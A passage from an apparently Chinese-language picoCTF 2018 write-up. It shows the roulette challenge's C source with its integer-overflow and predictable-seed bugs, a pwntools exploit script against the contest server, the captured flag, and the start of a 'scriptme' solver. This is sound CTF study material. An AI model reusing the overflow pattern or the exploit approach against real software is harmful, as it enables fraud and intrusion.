class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM_LEN 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOTSTREAK 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_WINS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_BILLION 1000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SIZE 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SPINS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROULETTE_SLOWS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_WIN_MSGS 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_LOSE_MSGS 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> cash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> wins = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//判断字符是否是数字,是则返回真。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_digit</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!is_digit(c))</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">while</span>(is_digit(c)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(l &gt;= LONG_MAX) &#123;</span><br><span class="line">l = LONG_MAX;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      l *= <span class="number">10</span>;</span><br><span class="line">      l += c - <span class="string">'0'</span>;</span><br><span class="line">      c = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\n'</span>)</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//随机返回一个小于5000的正整数</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> seed;</span><br><span class="line">  FILE *f = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fread(&amp;seed, <span class="keyword">sizeof</span>(seed), <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line">  seed = seed % <span class="number">5000</span>;</span><br><span class="line">  <span class="keyword">if</span> (seed &lt; <span class="number">0</span>) seed = seed * <span class="number">-1</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">return</span> seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印当前资金和获胜次数，下注。（输入点一）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_bet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How much will you wager?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Current Balance: $%lu \t Current Wins: %lu\n"</span>, cash, wins); </span><br><span class="line">    <span class="keyword">long</span> bet = get_long(); </span><br><span class="line">    <span class="keyword">if</span>(bet &lt;= cash) &#123;</span><br><span class="line">      <span class="keyword">return</span> bet;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You can't bet more than you have!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//选择下注目标1~36.（输入点二）</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_choice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choose a number (1-%d)\n"</span>, ROULETTE_SIZE);</span><br><span class="line">    <span class="keyword">long</span> choice = get_long();</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &lt;= choice &amp;&amp; choice &lt;= ROULETTE_SIZE) &#123;</span><br><span class="line">      <span class="keyword">return</span> choice;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Please enter a valid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印flag</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to open the flag file\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一些输赢后的提示语</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *win_msgs[NUM_WIN_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Wow.. Nice One!"</span>,</span><br><span class="line">  <span class="string">"You chose correct!"</span>,</span><br><span class="line">  <span class="string">"Winner!"</span>,</span><br><span class="line">  <span class="string">"Wow, you won!"</span>,</span><br><span class="line">  <span class="string">"Alright, now you're cooking!"</span>,</span><br><span class="line">  <span class="string">"Darn.. Here you go"</span>,</span><br><span class="line">  <span class="string">"Darn, you got it right."</span>,</span><br><span class="line">  <span class="string">"You.. win.. this round..."</span>,</span><br><span class="line">  <span class="string">"Congrats!"</span>,</span><br><span class="line">  <span class="string">"You're not cheating are you?"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs1[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"WRONG"</span>,</span><br><span class="line">  <span class="string">"Nice try.."</span>,</span><br><span class="line">  <span class="string">"YOU LOSE"</span>,</span><br><span class="line">  <span class="string">"Not this time.."</span>,</span><br><span class="line">  <span class="string">"Better luck next time..."</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs2[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Just give up!"</span>,</span><br><span class="line">  <span class="string">"It's over for you."</span>,</span><br><span class="line">  <span class="string">"Stop wasting your time."</span>,</span><br><span class="line">  <span class="string">"You're never gonna win"</span>,</span><br><span class="line">  <span class="string">"If you keep it up, maybe you'll get the flag in 100000000000 years"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//模拟转盘效果</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_roulette</span><span class="params">(<span class="keyword">long</span> spin)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Roulette  :  "</span>);</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">12500</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ROULETTE_SPINS; i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = ROULETTE_SPINS; i &lt; (ROULETTE_SPINS+ROULETTE_SIZE); i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((i%ROULETTE_SIZE)+<span class="number">1</span>) == spin) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; ROULETTE_SIZE; k++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, ((i+k)%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    s = <span class="number">1.1</span>*s;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld"</span>, spin);</span><br><span class="line">  usleep(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成一个随机数，如果和choice一样，就给cash加双倍bet。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play_roulette</span><span class="params">(<span class="keyword">long</span> choice, <span class="keyword">long</span> bet)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Spinning the Roulette for a chance to win $%lu!\n"</span>, <span class="number">2</span>*bet);</span><br><span class="line">  <span class="keyword">long</span> spin = (rand() % ROULETTE_SIZE)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  spin_roulette(spin);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (spin == choice) &#123;</span><br><span class="line">    cash += <span class="number">2</span>*bet;</span><br><span class="line">    <span class="built_in">puts</span>(win_msgs[rand()%NUM_WIN_MSGS]);</span><br><span class="line">    wins += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs1[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs2[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  cash = get_rand();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to ONLINE ROULETTE!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here, have $%ld to start on the house! You'll lose it all anyways &gt;:)\n"</span>, cash);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">long</span> bet;</span><br><span class="line">  <span class="keyword">long</span> choice;</span><br><span class="line">  <span class="keyword">while</span>(cash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      bet = get_bet();</span><br><span class="line">      cash -= bet;</span><br><span class="line">      choice = get_choice();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">      </span><br><span class="line">      play_roulette(choice, bet);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= MAX_WINS) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wow you won %lu times? Looks like its time for you cash you out.\n"</span>, wins);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congrats you made $%lu. See you next time!\n"</span>, cash);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(cash &gt; ONE_BILLION) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*** Current Balance: $%lu ***\n"</span>, cash);</span><br><span class="line"><span class="keyword">if</span> (wins &gt;= HOTSTREAK) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow, I can't believe you did it.. You deserve this flag!"</span>);</span><br><span class="line">  print_flag();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wait a second... You're not even on a hotstreak! Get out of here cheater!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Haha, lost all the money I gave you already? See ya later!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示说有两个bug。</p><p>其一出现在第27行，get_Long()函数的<code>uint64_t l = 0;</code> 。函数声明的返回值为<code>long</code> 型，实际返回值为<code>uint64_t</code> 型，前者有符号最大值为<code>LONG_MAX:2^31-1</code> ，后者无符号最大值为<code>ULONG_MAX:2^64-1</code> ，存在向上溢出为负数的风险。</p><p>真正使上溢成为可能的是32-35行 <code>if(l &gt;= LONG_MAX){l = LONG_MAX;  break;}</code> ，这个判断希望控制返回值不超过<code>long</code> 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。</p><p>到此为止，我们可以控制cash为任意值了，只要输入bet为 <code>当前cash+2^32-目标cash</code> ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。</p><p>要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。</p><p>如果要改变wins，只能使choice与166行的 <code>long spin = (rand() % ROULETTE_SIZE)+1;</code> 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 <a href="https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md" target="_blank" rel="noopener">https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md</a> ，偷个懒就不写了。</p><p><code>picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}</code> </p><p><img src="1541294444617.png" alt="1541294444617"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#get_rand_seq.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    srand(seed);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d,"</span>, rand());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'2018shell1.picoctf.com'</span>, <span class="number">21444</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">lines = r.recvuntil(<span class="string">'&gt; '</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line"></span><br><span class="line">balance = int(lines[<span class="number">1</span>].split()[<span class="number">2</span>][<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Start balance: &#123;&#125;"</span>.format(balance))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Predicting random values"</span>)</span><br><span class="line">values = subprocess.check_output([<span class="string">"./get_rand_seq"</span>, str(balance)])</span><br><span class="line">values = values.split(<span class="string">','</span>)</span><br><span class="line">values = [int(v, <span class="number">10</span>) <span class="keyword">for</span> v <span class="keyword">in</span> values[:<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ROULETTE_SIZE = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">   spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">   i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(balance, spin))</span><br><span class="line"></span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(balance))</span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(spin))</span><br><span class="line"></span><br><span class="line">   balance *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(<span class="number">11474836400</span>, spin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format(<span class="number">11474836400</span>)) <span class="comment"># Put some negative numbers, bug in get_long</span></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format((spin + <span class="number">1</span>) % <span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'You deserve this flag!'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h2 id="scriptme"><a href="#scriptme" class="headerlink" title="scriptme"></a>scriptme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/bintest<span class="comment"># nc 2018shell2.picoctf.com 61344</span></span><br><span class="line">Rules:</span><br><span class="line">() + () = ()()                                      =&gt; [combine]</span><br><span class="line">((())) + () = ((())())                              =&gt; [absorb-right]</span><br><span class="line">() + ((())) = (()(()))                              =&gt; [absorb-left]</span><br><span class="line">(())(()) + () = (())(()())                          =&gt; [combined-absorb-right]</span><br><span class="line">() + (())(()) = (()())(())                          =&gt; [combined-absorb-left]</span><br><span class="line">(())(()) + ((())) = ((())(())(()))                  =&gt; [absorb-combined-right]</span><br><span class="line">((())) + (())(()) = ((())(())(()))                  =&gt; [absorb-combined-left]</span><br><span class="line">() + (()) + ((())) = (()()) + ((())) = ((()())(())) =&gt; [left-associative]</span><br><span class="line"></span><br><span class="line">Example: </span><br><span class="line">(()) + () = () + (()) = (()())</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s start with a warmup.</span></span><br><span class="line"><span class="string">(()()()) + (()) = ???</span></span><br></pre></td></tr></table></figure><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">depth</span><span class="params">(s)</span>:</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(len(s)!=<span class="number">0</span>):</span><br><span class="line">        s=s.replace(<span class="string">'()'</span>,<span class="string">''</span>)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    d1=depth(s1)</span><br><span class="line">    d2=depth(s2)</span><br><span class="line">    <span class="keyword">if</span> d1==d2:</span><br><span class="line">        <span class="keyword">return</span> s1+s2</span><br><span class="line">    <span class="keyword">if</span> d1&lt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1,s2[<span 